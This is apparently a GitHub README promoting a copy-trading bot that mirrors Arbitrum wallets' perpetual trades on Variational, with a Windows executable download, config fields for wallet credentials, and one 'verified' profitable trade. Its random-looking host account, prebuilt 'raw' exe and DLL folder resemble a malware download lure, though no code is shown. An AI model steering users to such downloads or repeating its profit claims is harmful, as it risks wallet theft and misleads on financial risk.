# Variational Copy Trader

> Mirror the on-chain positions of top Variational traders in real time. The bot watches target wallets on Arbitrum, detects new perpetual trades, and replicates them in your account within seconds - with configurable size scaling and risk limits.

*Last updated: March 2026*

## What is Variational Copy Trader?

Variational Copy Trader monitors a list of high-performing Arbitrum wallets trading on Variational's RFQ perp DEX and automatically mirrors their positions in your account. When a target wallet opens a LONG on BTC-PERP, your bot enters the same trade proportionally scaled to your configured capital.

![preview_variational-copy-trader](https://github.com/user-attachments/assets/ed71d981-29a4-4bac-92d4-b1cf497fc071)

Variational has zero trading fees (0.1 USDC only on deposit/withdraw), which means copy trading does not bleed edge through per-trade costs. The 2-4% loss rebate also applies to copied positions, partially protecting against drawdown.

Target wallets are identified from Variational's on-chain leaderboard data. You supply the wallet addresses - the bot handles detection and execution.

---

## Download

| Platform | Architecture | Download |
|----------|-------------|----------|
| **Windows** | x64 | [Download the latest release](https://github.com/poxmetolog9iatb/variational-copy-trader/releases) |

---

## Copy Settings

| Setting | Example | Description |
|---------|---------|-------------|
| `target_wallets` | ["0xabc..."] | Wallets to mirror |
| `copy_ratio` | 0.10 | Your size as fraction of target's size |
| `max_position_usd` | 1000 | Hard cap per copied position |
| `min_position_usd` | 50 | Ignore trades below this size |
| `markets_filter` | ["BTC-PERP"] | Only copy these markets (empty = all) |
| `exit_mode` | mirror | mirror target exit or use own stop-loss |

---

## Engine Features

* **Real-time wallet watcher** - polls Arbitrum RPC and Variational API for new positions from target wallets
* **Proportional scaling** - sizes your copy at a fixed ratio of the target's notional
* **Hard position cap** - never deploys more than configured max per copied trade
* **Market filter** - optionally restrict copying to specific markets
* **Mirror exit** - closes your position when target closes theirs
* **Independent stop-loss** - optionally override with your own stop regardless of target behavior
* **Multi-wallet tracking** - monitors up to 20 target wallets simultaneously
* **Points accumulation** - all copied volume accrues Variational points toward Q3 2026 airdrop

---

## Two Ways to Run It

| | Windows App | Python Bot |
|---|---|---|
| **Setup** | Double-click | `pip install` + config |
| **Wallet list** | Config-based | Full code access |
| **Copy ratio** | Config slider | Direct code access |
| **Config** | `config.toml` | Direct code access |
| **Logs** | Dashboard | JSON per copy |

## Quick Start

```
# 1. Download from Releases
# 2. Edit config.toml - add target wallets and set your copy ratio
# 3. Run Copy Trader - mirror detection starts immediately
```

### Python

```bash
cd variational-copy-trader/python
pip install -r requirements.txt
python variational-copy-trader-raw-v.1.4.14.py
```

---

## How It Works

1. **Watch** - polls Arbitrum RPC for new Variational transactions from target wallets
2. **Decode** - parses RFQ transaction data to extract market, side, size, and price
3. **Scale** - calculates your copy size using configured ratio and caps
4. **Execute** - submits your mirrored RFQ quote via Arbitrum wallet signature

### Config Reference

```toml
[wallet]
api_key = ""
rpc_url = "https://arb1.arbitrum.io/rpc"

[copy]
target_wallets = ["0xabc...def", "0x123...456"]
copy_ratio = 0.10
max_position_usd = 1000
min_position_usd = 50
markets_filter = []
exit_mode = "mirror"
own_stop_loss_pct = 5.0

[limits]
max_open_positions = 10
daily_loss_limit_usd = 200

[alerts]
telegram_bot_token = ""
telegram_chat_id = ""
```

---

## Copy Log Format

```json
{
  "copy_id": "var_copy_20260319_033",
  "target_wallet": "0xabc...def",
  "market": "ETH-PERP",
  "side": "LONG",
  "target_size_usd": 10000.0,
  "copy_size_usd": 1000.0,
  "entry_price": 3218.40,
  "exit_price": 3301.75,
  "exit_type": "mirror",
  "pnl_usd": 25.88,
  "points_earned": 10
}
```

![variational copy positions view](https://github.com/user-attachments/assets/7265c70c-545f-474d-81c6-e006b87f1705)
---

## Verified Live

**Configuration used:**
* Target: 0xabc...def, copy ratio 10%, max $1,000, ETH-PERP + BTC-PERP

| | Details |
|---|---|
| Target trade | ETH-PERP LONG, $10,000 |
| Copy size | $1,000 (10% ratio) |
| Entry price | 3,218.40 |
| Trade ID | VAR-COPY-20260319-0331 |

| | Result |
|---|---|
| Mirror exit price | 3,301.75 |
| Net P&L | +$25.88 on $1,000 (2.59% ROI) |

---

## Frequently Asked Questions

**How does it find target wallets?**
You supply the wallet addresses manually. The bot detects their Variational trades by monitoring Arbitrum RPC events and Variational's position API. Recommended: use Variational's public leaderboard to identify top performers.

**What is the minimum copy ratio?**
Any ratio above 0 is valid. A ratio of 0.05 means your copy is 5% of the target's trade size. Use `min_position_usd` to discard very small resulting positions.

**Does it copy all markets?**
By default yes. Set `markets_filter` in config to restrict to specific markets like BTC-PERP or ETH-PERP.

**What if the target wallet exits while I'm at a loss?**
If `exit_mode = "mirror"`, the bot will close your position when the target closes theirs, regardless of your P&L. Set `own_stop_loss_pct` to exit independently before that if losses exceed your threshold.

**Does copied volume count for the airdrop?**
Yes. All volume transacted on Variational - whether copied or self-directed - accrues points in the Q3 2026 points program.

**How many wallets can I track?**
Up to 20 simultaneously in the current version. Additional wallets can be added in the Python version without limit.

---

## Use Cases

- **Variational copy trading** - mirror Arbitrum's top Variational traders automatically
- **Perp DEX mirror bot** - replicate RFQ perp positions with proportional size scaling
- **Arbitrum wallet tracker** - detect and copy on-chain perp trades from target addresses
- **Variational leaderboard follower** - automate following top wallets from Variational's leaderboard
- **Airdrop points via copy volume** - accumulate Q3 2026 points through mirrored trading activity

---

## Repository Structure

```
variational-copy-trader/
+-- variational-copy-trader-raw-v.1.4.14.exe
+-- config.toml
+-- data/
|   +-- copies/
|   +-- logs/
|   +-- dll/
+-- python/
|   +-- src/
|   |   +-- watcher.py
|   |   +-- decoder.py
|   |   +-- scaler.py
|   |   +-- executor.py
|   +-- requirements.txt
+-- README.md
```

---

## Requirements

```
python-dotenv, web3, eth-account, httpx, typer[all], devtools
```

* Arbitrum wallet with USDC balance
* Variational account (wallet connected at variational.market)
* Telegram bot token (optional)

---

*Follow the best. Zero fees. All returns.*
